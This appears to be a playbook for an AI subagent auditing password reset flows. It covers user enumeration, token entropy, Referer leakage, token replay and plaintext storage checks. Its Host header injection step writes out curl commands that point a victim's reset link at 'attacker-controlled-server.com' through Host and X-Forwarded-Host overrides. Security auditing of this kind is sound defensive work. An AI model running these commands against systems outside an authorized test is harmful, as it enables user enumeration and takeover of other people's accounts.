# Subagent 03: Password Reset Flows & Account Takeovers

## Role & Mission
Responsible for auditing the password reset lifecycle: token generation entropy, URL token parameter leaks, response-based email enumeration, single-use token enforcement, Host header injection account takeovers, and plaintext password storage indicators.

## Assigned Checklist Tasks (7 Checks)
- **Check 04:** Password reset token predictability or entropy issues (PRNG flaws, timestamp hashes)
- **Check 05:** Password reset token sent in URL query strings (GET parameter leakage in Referer/logs)
- **Check 06:** Password reset email/user enumeration via disparate server responses
- **Check 13:** Passwords stored in plaintext or reversible encryption
- **Check 31:** Password reset token expiration and single-use enforcement
- **Check 32:** Password reset account takeover via Host header injection or parameter pollution
- **Check 36:** Password pepper usage and modern cryptographic hashing evaluation

---

## Standardized Execution Playbook

### Step 1: Password Reset Email Enumeration (Check 06)
Compare server responses when requesting password resets for registered vs unregistered accounts:

```bash
# 1. Request reset for known valid user
RESP_VALID=$(curl -s -i -X POST "https://<target>/api/auth/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"registered_user@target.com"}')

# 2. Request reset for random invalid user
RESP_INVALID=$(curl -s -i -X POST "https://<target>/api/auth/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent_user_99182@target.com"}')

# Audit differences:
# - HTTP Status code (e.g. 200 vs 404)
# - Response body ("We sent a reset link" vs "Email does not exist")
# - Response time (sending email takes 800ms, rejecting takes 50ms)
```

### Step 2: Password Reset Token Entropy & Predictability (Check 04)
Request multiple reset tokens in rapid succession and analyze generation patterns:

```bash
# Check if tokens are:
# - Sequential integers: 1001, 1002, 1003
# - Base64 encoded timestamps: base64(time())
# - MD5 / SHA1 of username or email: md5("user@target.com")
# - Weak PRNG: Math.random() in Node.js
```

### Step 3: Password Reset Token Leakage via GET / Referer (Check 05)
*Vulnerability Identification:* If the reset link formats the token in a query string (`https://target.com/reset?token=xyz`), clicking any external links (privacy policy, third-party CDNs, analytics) will leak the raw token in the `Referer` header:

```bash
# Check if reset link transmits token in URL query parameter vs URL fragment (#) or POST body
curl -sI "https://<target>/reset-password?token=sample_token" | grep -i "Referrer-Policy"
# If Referrer-Policy is missing or unsafe (e.g. no-referrer-when-downgrade), tokens leak to third parties
```

### Step 4: Password Reset Token Single-Use & Expiration (Check 31)
*Audit Procedure:*
1. Request a password reset link and complete the password change.
2. Intercept the final POST request and replay the exact same token a second time.
3. If the second request returns `200 OK` and allows another password change, the token lacks single-use invalidation.
4. Test token expiration window (does the token remain valid after 24 hours?).

### Step 5: Password Reset Account Takeover via Host Header Injection (Check 32 & KongList.txt)
*Methodology from KongList.txt & TBHM:*
If the backend constructs the reset email link using the HTTP `Host` header, an attacker can poison the password reset link to point to an attacker-controlled server:

```bash
# Test Host Header Injection
curl -s -X POST "https://<target>/api/auth/forgot-password" \
  -H "Host: attacker-controlled-server.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

# Test Alternative Header Overrides
HEADERS_HOST=(
  "X-Forwarded-Host: attacker-controlled-server.com"
  "X-Host: attacker-controlled-server.com"
  "X-Forwarded-Server: attacker-controlled-server.com"
)

for hh in "${HEADERS_HOST[@]}"; do
  curl -s -X POST "https://<target>/api/auth/forgot-password" \
    -H "$hh" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@target.com"}'
done
```

### Step 6: Plaintext Password Storage Verification (Check 13)
- If the application ever sends the current password in plaintext via email ("Your password is: ..."), passwords are stored in plaintext or reversible encryption.
- Inspect profile and user API responses (`/api/user/me`) for exposed password fields (`"password": "..."`).

---

## Output Artifact
Aggregate findings into:
`artifacts/subagent_03_reset_flows.md`
